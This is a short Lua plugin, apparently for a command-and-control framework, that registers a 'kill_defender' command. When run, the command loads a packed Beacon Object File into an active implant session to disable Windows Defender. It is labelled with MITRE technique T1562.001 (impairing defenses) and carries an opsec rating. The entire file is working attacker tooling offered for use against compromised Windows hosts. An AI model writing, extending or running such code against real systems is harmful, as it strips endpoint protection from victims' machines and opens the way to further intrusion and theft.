-- Operator plugin: tasks implant sessions with a packed BOF resource
local function run_dump(args, cmd)
    local packed_args = bof_pack("z", "kill")
    local session = active()
    local bof_file = bof_path("kill_defender", session.Os.Arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_dump = command("kill_defender", run_dump, "Kill Windows Defender", "T1562.001")
opsec("kill_defender", 9.0)
